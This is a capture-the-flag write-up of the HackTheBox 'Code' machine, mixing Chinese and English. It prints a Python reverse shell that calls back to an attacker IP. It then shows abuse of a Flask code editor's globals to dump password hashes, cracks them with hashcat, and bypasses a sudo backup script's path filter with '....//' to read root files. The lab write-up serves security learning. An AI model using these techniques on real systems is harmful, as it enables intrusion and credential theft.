---
title: 'HackTheBox: Code
'
disqus: hackmd
---

HackTheBox: Code
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/Code

### Initial Enumeration

● Start Machine: `10.10.11.62`\
![image](https://hackmd.io/_uploads/B16X3A1Jxl.png)


```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -Pn 10.10.11.62
Nmap scan report for 10.10.11.62
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
> SSH, HTTP

瀏覽 http://10.10.11.62:5000/
![image](https://hackmd.io/_uploads/ByjAaRkkgl.png)

## Solution

### 1. Python reverse shell
```py
import socket
import subprocess
import os

ip = "{Kali IP}"
port = 8888

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

subprocess.call(["/bin/sh", "-i"])
```
> Use of restricted keywords is not allowed.

### 2. Target Object
#### 2.1 globals()
```
print(globals())

> {'__name__': 'app', '__doc__': None, '__package__': '', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f75638bf610>, '__spec__': ModuleSpec(name='app', loader=<_frozen_importlib_external.SourceFileLoader object at 0x7f75638bf610>, origin='/home/app-production/app/app.py'), '__file__': '/home/app-production/app/app.py', '__cached__': '/home/app-production/app/__pycache__/app.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2021 Python Software Foundation.\nAll Rights Reserved.\n\nCopyright (c) 2000 BeOpen.com.\nAll Rights Reserved.\n\nCopyright (c) 1995-2001 Corporation for National Research Initiatives.\nAll Rights Reserved.\n\nCopyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.\nAll Rights Reserved., 'credits':     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands\n    for supporting Python development.  See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'Flask': <class 'flask.app.Flask'>, 'render_template': <function render_template at 0x7f756327dee0>, 'render_template_string': <function render_template_string at 0x7f756327df70>, 'request': <Request 'http://10.10.11.62:5000/run_code' [POST]>, 'jsonify': <function jsonify at 0x7f7563528c10>, 'redirect': <function redirect at 0x7f75633913a0>, 'url_for': <function url_for at 0x7f7563391310>, 'session': <SecureCookieSession {}>, 'flash': <function flash at 0x7f7563391550>, 'SQLAlchemy': <class 'flask_sqlalchemy.extension.SQLAlchemy'>, 'sys': <module 'sys' (built-in)>, 'io': <module 'io' from '/usr/lib/python3.8/io.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'hashlib': <module 'hashlib' from '/usr/lib/python3.8/hashlib.py'>, 'app': <Flask 'app'>, 'db': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>, 'User': <class 'app.User'>, 'Code': <class 'app.Code'>, 'index': <function index at 0x7f75622cb8b0>, 'register': <function register at 0x7f75622cbb80>, 'login': <function login at 0x7f75622cbc10>, 'logout': <function logout at 0x7f75622cbca0>, 'run_code': <function run_code at 0x7f75622cbe50>, 'load_code': <function load_code at 0x7f7562147040>, 'save_code': <function save_code at 0x7f75621471f0>, 'codes': <function codes at 0x7f75621473a0>, 'about': <function about at 0x7f7562147550>
```
>  Flask Web App
> > 1. `'User': <class 'app.User'>` 可直接存取的 SQLAlchemy model: `query.all()`
> > 2. `'db': <SQLAlchemy sqlite:////home/app-production/app/instance/database.db>`: SQLAlchemy
> > 3. `'request': <Request 'http://10.10.11.62:5000/run_code' [POST]>
'session': <SecureCookieSession {}>`: HTTP request context (Header/cookie)
>> 4. 可用 module: `'os': <module 'os' from '/usr/lib/python3.8/os.py'>,
'sys': <module 'sys' (built-in)>,
'io': <module 'io' from '/usr/lib/python3.8/io.py'>,
'hashlib': <module 'hashlib' from '/usr/lib/python3.8/hashlib.py'>,`

#### 2.2 所有 user
猜測 column: username, password
```
print([(u.id, u.username, u.password) for u in User.query.all()])

> (1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'), (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')


for u in User.query.all():
    print(u.__dict__)

>'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7f424d3cf280>, 'password': '759b74ce43947f5f4c91aeddc3e5bad3', 'id': 1, 'username': 'development'}\n{'_sa_instance_state': <sqlalchemy.orm.state.InstanceState object at 0x7f424d3cf2e0>, 'password': '3de6f30c4a09c27fc71932bfc68474be', 'id': 2, 'username': 'martin'
```
> 1. `development` : `759b74ce43947f5f4c91aeddc3e5bad3`
> 2. `martin` : `3de6f30c4a09c27fc71932bfc68474be`

### 3. Hashcat
將 Hash 存成 Code.hash
```
┌──(chw㉿CHW)-[~]
└─$ cat Code.hash 
759b74ce43947f5f4c91aeddc3e5bad3
3de6f30c4a09c27fc71932bfc68474be
```
Hash identifier:
```
┌──(chw㉿CHW)-[~]
└─$ nth -f Code.hash 

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

759b74ce43947f5f4c91aeddc3e5bad3

Most Likely 
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach

Least Likely
... 

3de6f30c4a09c27fc71932bfc68474be

Most Likely 
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach
...
```
> MD5 (Mode 0)

Hashcat 爆破
```
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 0 Code.hash  /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting
...
759b74ce43947f5f4c91aeddc3e5bad3:development              
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
...
```
> 1. `development` : `development`
> 2. `martin` : `nafeelswordsmaster`

### 4. SSH Login
- 登入 development
```
┌──(chw㉿CHW)-[~]
└─$ ssh development@10.10.11.62
The authenticity of host '10.10.11.62 (10.10.11.62)' can't be established.
ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.62' (ED25519) to the list of known hosts.
development@10.10.11.62's password: 
Permission denied, please try again.
```
> 失敗
- 登入 martin
```
┌──(chw㉿CHW)-[~]
└─$ ssh martin@10.10.11.62     
martin@10.10.11.62's password: 
...
martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
martin@code:~$ hostname
code
martin@code:~$ pwd
/home/martin
martin@code:~$ ls
backups
martin@code:/$ find / -name "user.txt" 2>/dev/null
martin@code:/home$ ls
app-production  martin
```
> 沒有 user flag\
> 1. martin 只有 backups folder
> 2. /home/app-production 沒有權限

猜測是 `app-production/` 備份到 `martin/backups/`\
🎯 將 `app-production/` 路徑下的 user.txt 備份出來

### 5. Search Backup config
```
martin@code:/$ find / -name "backup*" 2>/dev/null
/usr/src/linux-headers-5.4.0-208-generic/include/config/wm831x/backup.h
/home/martin/backups
/var/backups
martin@code:/$ find / -name "back*" 2>/dev/null
/usr/bin/backy.sh
/usr/bin/backy
/usr/include/c++/9/backward
/usr/include/c++/9/backward/backward_warning.h
/usr/lib/python3/dist-packages/UpdateManager/backend
/usr/lib/python3/dist-packages/keyring/backend.py
/usr/lib/python3/dist-packages/keyring/backends
/usr/lib/python3/dist-packages/keyring/__pycache__/backend.cpython-38.pyc
/usr/lib/python3/dist-packages/keyring/tests/backends
/usr/lib/python3/dist-packages/urllib3/packages/backports
...
```
用 VScode 查看檔案內容\
在 `/usr/bin/backy.sh` 找到
```sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"

```
> 1. 傳入 `task.json`
> 2. 清理 JSON 路徑，移除 `../`
> 3. 備份的目錄在 `/var/` 或 `/home/` 

### 6. task.json
在 `/home/martin/backups` 中有 `task.json`
```
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}

```
直接修改成 backups flag

> [!TIP]
>`backy.sh`只限定存取路徑，沒有限制權限
>若繞過 `../` 應該能直存取 `/root`

```
martin@code:~/backups$ cat task.json 
{
        "destination": "/home/martin/backups",
        "multiprocessing": true,
        "verbose_log": true,
        "directories_to_archive": [
                "/home/app-production/user.txt",
                "/var/....//root/root.txt"
        ]
}
martin@code:~/backups$ sudo /usr/bin/backy.sh task.json
2025/04/19 14:10:58 🍀 backy 1.2
2025/04/19 14:10:58 📋 Working with task.json ...
2025/04/19 14:10:58 💤 Nothing to sync
2025/04/19 14:10:58 📤 Archiving: [/home/app-production/user.txt /var/../root/root.txt]
2025/04/19 14:10:58 📥 To: /home/martin/backups ...
tar: Removing leading `/' from member names2025/04/19 14:10:58 📦
tar: 
/home/app-production/user.txt
Removing leading `/var/../' from member names
/var/../root/root.txt
2025/04/19 14:10:58 📦 📦
martin@code:~/backups$ ls
code_home_app-production_user.txt_2025_April.tar.bz2  code_var_.._root_root.txt_2025_April.tar.bz2  home  task.json
martin@code:~/backups$
```
> `....//` 經過 updated_json 後 👉🏻 `../`
>> 產出兩個壓縮檔
>> 1. `code_home_app-production_user.txt_2025_April.tar.bz2`
>> 2. `code_var_.._root_root.txt_2025_April.tar.bz2`


### ✅ Get User Flag
```
martin@code:~/backups$ tar -xvjf code_home_app-production_user.txt_2025_April.tar.bz2 
home/app-production/user.txt
```

### ✅ Get Root FLAG
```
martin@code:~/backups$ tar -xvjf code_var_.._root_root.txt_2025_April.tar.bz2 
root/root.txt
```
![image](https://hackmd.io/_uploads/SJ5DkEbJlg.png)



###### tags: `HTB` `Web` `CTF` 
